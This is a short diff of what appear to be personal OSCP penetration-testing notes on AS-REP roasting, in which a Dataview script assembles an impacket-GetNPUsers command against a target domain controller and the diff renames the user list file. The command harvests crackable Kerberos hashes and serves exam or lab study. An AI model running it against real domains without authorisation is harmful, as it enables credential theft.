@@ -85,7 +85,7 @@ The AS-REP (Authentication Server Response) is an encrypted Kerberos Ticket-Gran
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");
 const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";const ip = page?.IP ?? "NO IP FOUND";
 
-const command = `impacket-GetNPUsers -request -usersfile Users.txt ${discoveredDomain}/ -dc-ip ${ip}`;
+const command = `impacket-GetNPUsers -request -usersfile users ${discoveredDomain}/ -dc-ip ${ip}`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
